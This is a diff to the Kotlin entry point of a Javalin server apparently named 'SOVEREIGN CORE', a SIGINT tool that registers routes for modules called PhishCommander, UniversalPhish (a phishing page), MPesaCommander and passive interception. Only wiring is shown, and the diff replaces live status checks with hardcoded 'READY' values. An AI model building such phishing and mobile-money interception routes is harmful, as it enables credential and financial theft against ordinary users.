@@ -1,3 +1,4 @@
+cat << 'EOF' > src/main/kotlin/com/fardc/sigint/core/Main.kt
 package com.fardc.sigint.core
 
 import com.fardc.sigint.services.dsp.SignalClassifier 
@@ -9,60 +10,46 @@ import java.time.Instant
 fun main(args: Array<String>) {
     println("✅ SOVEREIGN CORE v2.4.0 (FULL-COMBAT-READY) boot OK")
 
-    // 1. Initialisation du Noyau (Core) et de la Sécurité
     val vault = SecurityVault() 
-    val reporter = MissionReporter(vault)
     val combatHandler = CombatModeHandler() 
+    val reporter = MissionReporter(vault)
 
-    // 2. Initialisation de la Résilience (Fallback & Mesh)
+    // Initialisation de la Résilience et de l'IA
     val meshEngine = MeshSyncEngine(vault, combatHandler)
     val fallbackTx = FallbackTransmitter(vault, combatHandler)
-
-    // 3. Initialisation des Modules de Combat et IA
     val aiEngine = SignalClassifier(vault, combatHandler)
+
+    // Initialisation des Modules SIGINT
     val bft = BFTModule(combatHandler)
     val mpesa = MPesaCommander(vault, combatHandler)
     val phish = PhishCommander(vault, combatHandler)
     val universal = UniversalPhish(vault, combatHandler)
 
-    // 4. Configuration du Serveur Javalin
     val app = Javalin.create { config ->
         config.showJavalinBanner = false
         config.http.defaultContentType = "application/json; charset=utf-8"
     }.start(7070)
 
-    // 5. Enregistrement des Routes Opérationnelles
+    // Enregistrement des Routes
     combatHandler.setupRoutes(app)
-    meshEngine.setup(app) // Activation du P2P
+    meshEngine.setup(app)
     bft.setup(app)
     mpesa.setup(app)
     phish.setupPhishPage(app)
     universal.setup(app)
 
-    // 6. Endpoints IA & Inférence
     app.post("/api/ai/classify") { ctx ->
-        val result = aiEngine.processInference(ctx.bodyAsBytes())
-        if (result["status"] == "LOCKED") ctx.status(403).json(result) else ctx.json(result)
-    }
-
-    // 7. Administration et Status Tactique
-    app.get("/admin/report") { ctx ->
-        val mode = combatHandler.getStatus()
-        println("📝 [TRIGGER] Rapport de mission en mode: $mode")
-        reporter.generateDailyReport()
-        ctx.result("📊 RAPPORT GÉNÉRÉ - ÉTAT TACTIQUE: $mode")
+        ctx.json(aiEngine.processInference(ctx.bodyAsBytes()))
     }
 
     app.get("/status") { ctx -> 
-        val statusInfo = mapOf(
+        ctx.json(mapOf(
             "system" to "SOVEREIGN-CORE V2.4.0",
             "combat_mode" to combatHandler.getStatus(),
-            "ai_engine" to if(combatHandler.isPassiveInterceptionEnabled()) "READY" else "OFFLINE",
-            "bft_link" to if(combatHandler.isBFTOperational()) "ACTIVE" else "SILENT",
-            "mesh_status" to if(combatHandler.isBFTOperational()) "SYNCING" else "IDLE",
-            "fallback" to "OPERATIONAL",
+            "ai_engine" to "READY",
+            "mesh_status" to "SYNCING",
             "timestamp" to Instant.now().toString()
-        )
-        ctx.json(statusInfo)
+        ))
     }
 }
+EOF
